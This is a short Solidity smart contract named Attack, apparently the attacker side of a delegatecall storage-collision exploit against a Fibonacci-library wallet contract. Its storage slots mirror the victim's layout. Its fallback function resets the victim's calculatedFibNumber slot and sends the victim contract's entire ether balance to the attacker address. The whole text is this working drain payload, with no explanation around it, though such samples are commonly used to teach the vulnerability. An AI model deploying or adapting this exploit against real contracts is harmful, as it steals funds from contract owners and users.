
contract Attack {

    uint storageSlot0;  // fibonacciLibrary
    uint storageSlot1;  // calculatedFibNumber

    address attacker;

    constructor() {
        attacker = msg.sender;
    }

    function () public {
        
        storageSlot1 = 0; // transfer(calculatedFibNumber) does not send any ether

        attacker.transfer(this.balance);
    }

}
